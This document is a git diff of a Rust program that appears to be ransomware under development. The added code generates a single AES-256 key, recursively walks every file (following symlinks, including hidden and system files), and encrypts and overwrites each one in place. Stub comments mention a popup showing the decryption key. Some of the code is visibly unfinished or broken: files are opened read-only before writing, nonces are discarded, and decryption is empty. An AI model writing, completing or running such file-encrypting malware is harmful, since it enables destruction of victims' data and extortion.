@@ -26,8 +26,25 @@ fn main() {
         .spawn()
         .expect("ruh roh");
 
-    // test_encryptfile();
-    traverse();
+    /**
+     * Use AES-256
+     * Same key for all files, different nonce for each file
+     *
+     * Notes: nonce is to make sure 2 identical plaintexts produce different output
+     * counter is to make sure 2 identical blocks within the same plaintext produce different output
+     *
+     * Returns: the cipher object
+     */
+    let mut rng = ChaCha20Rng::from_entropy(); //FIXME: later. I dont like that this rng code is repeated twice
+    let mut nonce_array = [0u8; 12];
+    rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
+    let nonce = Nonce::from_slice(&nonce_array);
+
+    //FIXME: up to here. making the nonce
+    let key = Aes256GcmSiv::generate_key(rng);
+    let cipher = Aes256GcmSiv::new(&key);
+
+    traverse(true, &cipher); //iterates through all the files and calls the encrypt function on each one
 }
 
 /**
@@ -56,7 +73,7 @@ fn check_requirements() {
 
 fn display_message() {
     //popup WITH THE DECRYPTION KEY ON THE POPUP
-    //
+    //idk what to use for thsi
 }
 
 /**
@@ -107,7 +124,7 @@ fn test_encryptfile() {
         //key length 32, nonce length 12
         if user_input_bytes.len() != 32 {
             //print error
-            println!("Invalid key length")
+            println!("Invalid key length");
         } else {
             // //FIXME: convert byte array into key format why this no work
             // //WHY THIS NO WORK
@@ -122,36 +139,14 @@ fn test_encryptfile() {
 }
 
 /**
- * TODO: the initialization code for the cipher is here atm
- * idk if ill move it later
  *
- * Use AES-256
- *
- * Same key for all files, different nonce for each file
- *
- * Notes: nonce is to make sure 2 identical plaintexts produce different output
- * counter is to make sure 2 identical blocks within the same plaintext produce different output
- *
- * Returns the cipher object
- */
-fn init_cipher() -> Aes256GcmSiv {
-    let mut rng = ChaCha20Rng::from_entropy();
-    let mut nonce_array = [0u8; 12];
-    rng.fill_bytes(&mut nonce_array); //fill the nonce_array with random bytes. the actual rng happens here
-    let nonce = Nonce::from_slice(&nonce_array);
-
-    //FIXME: up to here. making the nonce
-    let key = Aes256GcmSiv::generate_key(rng);
-    Aes256GcmSiv::new(&key)
-}
-
-/**
+ * Note
  * find all the files in subdirectories.
  * follow symlinks, don't skip hidden files
  *
  * FIXME: this will probably mess up some system files, fix later
  */
-fn traverse() -> Result<(), Error> {
+fn traverse(do_encrypt: bool, cipher: &Aes256GcmSiv) -> Result<(), Error> {
     //return result
     //search recursively through all directories and find files
     let mut file = File::create("C:\\Users\\win11\\Desktop\\output.txt");
@@ -165,7 +160,7 @@ fn traverse() -> Result<(), Error> {
                     "found file: {}",
                     entry.path().display()
                 );
-                encrypt(entry.path());
+                encrypt(entry.path(), cipher);
             }
             Err(e) => {
                 writeln!(file.as_ref().unwrap(), "Error: {}", e);
@@ -176,20 +171,32 @@ fn traverse() -> Result<(), Error> {
 }
 
 /**
- * Encrypt a given file
+ * Encrypt a file, using given path and the same key for all files
+ * Use different nonce for each file, prepend to file
  */
-fn encrypt(path: &Path) {
+fn encrypt(path: &Path, cipher: &Aes256GcmSiv) {
     let mut file = File::open(path).expect("can't open file");
+    let mut buffer = Vec::new();
+    file.read_to_end(&mut buffer)
+        .expect("can't load file contents");
+
+    //TODO: make a nonce, use it, append to the beginning or end of file
+    let mut rng = ChaCha20Rng::from_entropy();
+    let mut nonce_array = [0u8; 12];
+    rng.fill_bytes(&mut nonce_array);
+    let nonce = Nonce::from_slice(&nonce_array);
+    let ciphertext = cipher.encrypt(nonce, buffer.as_ref());
+    //put the ciphertext bac into the file
+    file.set_len(0);
+    file.write_all(&ciphertext.unwrap().as_slice());
+
+    //TESTCODE: delete later. shows the key so i dont lock myself out
 }
 
 /**
- * file encryption done with aes gcm
+ * Decrypt a file
  */
-// fn encrypt(file_path: &Path, encryption_key: ) {//get a reference of the path
-//     //decide which encryption scheme to use. SAME KEy
-// }
-
-fn decrypt() {
+fn decrypt(path: &Path, cipher: &Aes256GcmSiv) {
     //
 }
 
